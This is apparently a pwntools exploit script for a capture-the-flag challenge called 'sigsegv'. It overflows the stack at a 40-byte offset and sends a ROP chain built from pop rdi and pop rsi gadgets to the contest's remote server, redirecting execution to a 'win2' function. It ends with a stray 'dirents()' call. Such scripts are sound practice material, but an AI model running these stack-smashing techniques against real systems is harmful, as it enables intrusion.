from pwn import *

context.arch = 'amd64'

elf = context.binary = ELF('old/sigsegv')
# 400a16 win2S
# 400bab pop rdi ; ret
# 400ba9 pop rsi ; pop r15 ; ret
p = remote('nc.ctf.unitedctf.ca', 4000)
#p = elf.process()
offset = 40

pop_rdi = 0x400bab
pop_rsi_r15 = 0x400ba9

payload = flat({
    offset: [
        0x1337133713371337,
        pop_rdi,
        0x0,
        0x0,
        pop_rsi_r15,
        elf.symbols.win2,
    ]
})

p.recvuntil(b"it's stack smashing time: ")
log.info(f"sending payload {payload}")
p.sendline(payload)

print(p.recv())

p.interactive()

dirents()